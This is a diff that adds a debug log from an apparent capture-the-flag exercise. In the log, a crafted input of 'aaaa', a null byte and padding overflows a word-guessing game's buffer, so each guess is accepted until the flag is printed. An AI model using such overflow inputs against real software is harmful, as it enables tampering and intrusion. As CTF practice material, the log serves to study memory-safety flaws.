@@ -1,0 +1,23 @@
+    'Correct word: aaaa\n'
+    'You won (wow)! +10 coins.\n'
+    'Your current balance: 980\n'
+    'Guess me a string of length 4 with lowercase letters: '
+[DEBUG] Sent 0xd bytes:
+    00000000  61 61 61 61  00 61 61 61  61 61 61 61  0a           │aaaa│·aaa│aaaa│·│
+    0000000d
+[DEBUG] Received 0x11 bytes:
+    'Your guess: aaaa\n'
+[DEBUG] Received 0x7d bytes:
+    'Correct word: aaaa\n'
+    'You won (wow)! +10 coins.\n'
+    'Your current balance: 990\n'
+    'Guess me a string of length 4 with lowercase letters: '
+[DEBUG] Sent 0xd bytes:
+    00000000  61 61 61 61  00 61 61 61  61 61 61 61  0a           │aaaa│·aaa│aaaa│·│
+    0000000d
+[DEBUG] Received 0x11 bytes:
+    'Your guess: aaaa\n'
+[DEBUG] Received 0x61 bytes:
+    'Correct word: aaaa\n'
+    'You won (wow)! +10 coins.\n'
+    'bctf{0v3rfl0w_w1th0ut_5m45h1ng}\n'
